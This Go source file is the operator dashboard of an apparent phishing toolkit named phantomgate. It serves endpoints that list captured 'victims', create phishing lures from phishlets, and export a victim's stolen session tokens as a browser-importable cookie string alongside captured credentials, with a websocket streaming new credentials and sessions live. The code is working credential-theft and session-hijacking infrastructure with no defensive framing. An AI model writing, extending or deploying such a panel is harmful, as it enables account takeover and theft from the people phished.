package dashboard

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"sync"

	"github.com/gorilla/websocket"
	"github.com/phantomgate/phantomgate/internal/lure"
	"github.com/phantomgate/phantomgate/internal/store"
)

// Server is the operator dashboard backend
type Server struct {
	store     *store.Store
	lures     *lure.Generator
	adminPass string
	clients   map[*websocket.Conn]bool
	mu        sync.Mutex
	upgrader  websocket.Upgrader
}

// NewServer creates a new dashboard server
func NewServer(s *store.Store, l *lure.Generator, adminPass string) *Server {
	srv := &Server{
		store:     s,
		lures:     l,
		adminPass: adminPass,
		clients:   make(map[*websocket.Conn]bool),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return true },
		},
	}

	// Start broadcasting captured data in real-time
	go srv.broadcastLoop()

	return srv
}

// Start starts the dashboard HTTP server
func (s *Server) Start(addr string) error {
	mux := http.NewServeMux()

	// API endpoints
	mux.HandleFunc("/api/stats", s.authMiddleware(s.handleStats))
	mux.HandleFunc("/api/victims", s.authMiddleware(s.handleVictims))
	mux.HandleFunc("/api/lures", s.authMiddleware(s.handleLures))
	mux.HandleFunc("/api/lures/create", s.authMiddleware(s.handleCreateLure))
	mux.HandleFunc("/api/sessions/export", s.authMiddleware(s.handleExportSession))

	// WebSocket for real-time feed
	mux.HandleFunc("/ws", s.handleWebSocket)

	// Serve static dashboard UI
	mux.HandleFunc("/", s.handleDashboardUI)

	log.Printf("[🖥️  DASHBOARD] Operator panel ready → https://%s", addr)
	return http.ListenAndServe(addr, mux)
}

func (s *Server) authMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		// Check Authorization header
		token := r.Header.Get("X-Admin-Token")
		if token == "" {
			token = r.URL.Query().Get("token")
		}
		if token != s.adminPass {
			http.Error(w, `{"error":"Unauthorized"}`, http.StatusUnauthorized)
			return
		}
		next(w, r)
	}
}

func (s *Server) handleStats(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(s.store.GetStats())
}

func (s *Server) handleVictims(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(s.store.GetAllVictims())
}

func (s *Server) handleLures(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(s.lures.List())
}

func (s *Server) handleCreateLure(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", 405)
		return
	}

	var body struct {
		Phishlet    string `json:"phishlet"`
		Path        string `json:"path"`
		Info        string `json:"info"`
		RedirectURL string `json:"redirect_url"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		http.Error(w, `{"error":"Invalid body"}`, 400)
		return
	}

	newLure := s.lures.Create(body.Phishlet, body.Path, body.Info, body.RedirectURL)
	fullURL := s.lures.GetURL(newLure)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"lure": newLure,
		"url":  fullURL,
	})
}

func (s *Server) handleExportSession(w http.ResponseWriter, r *http.Request) {
	victimID := r.URL.Query().Get("victim_id")
	if victimID == "" {
		http.Error(w, `{"error":"victim_id required"}`, 400)
		return
	}

	victim, ok := s.store.GetVictim(victimID)
	if !ok {
		http.Error(w, `{"error":"Victim not found"}`, 404)
		return
	}

	// Export as a cookie string that can be imported into a browser
	var cookieLines []string
	for name, value := range victim.Tokens {
		cookieLines = append(cookieLines, fmt.Sprintf("%s=%s", name, value))
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"victim_id":     victimID,
		"cookie_string": joinCookies(cookieLines),
		"tokens":        victim.Tokens,
		"credentials":   victim.Credentials,
	})
}

func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[!] WebSocket upgrade failed: %v", err)
		return
	}

	s.mu.Lock()
	s.clients[conn] = true
	s.mu.Unlock()

	log.Printf("[🖥️  DASHBOARD] Operator connected via WebSocket")

	// Keep connection alive, remove on disconnect
	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			s.mu.Lock()
			delete(s.clients, conn)
			s.mu.Unlock()
			conn.Close()
			break
		}
	}
}

func (s *Server) broadcastLoop() {
	for {
		select {
		case cred := <-s.store.OnCredential:
			s.broadcast(map[string]interface{}{
				"type": "credential",
				"data": cred,
			})
		case sess := <-s.store.OnSession:
			s.broadcast(map[string]interface{}{
				"type": "session",
				"data": sess,
			})
		case victim := <-s.store.OnNewVictim:
			s.broadcast(map[string]interface{}{
				"type": "new_victim",
				"data": victim,
			})
		}
	}
}

func (s *Server) broadcast(msg interface{}) {
	s.mu.Lock()
	defer s.mu.Unlock()

	data, err := json.Marshal(msg)
	if err != nil {
		return
	}

	for conn := range s.clients {
		err := conn.WriteMessage(websocket.TextMessage, data)
		if err != nil {
			conn.Close()
			delete(s.clients, conn)
		}
	}
}

func (s *Server) handleDashboardUI(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(dashboardHTML))
}

func joinCookies(cookies []string) string {
	result := ""
	for i, c := range cookies {
		if i > 0 {
			result += "; "
		}
		result += c
	}
	return result
}
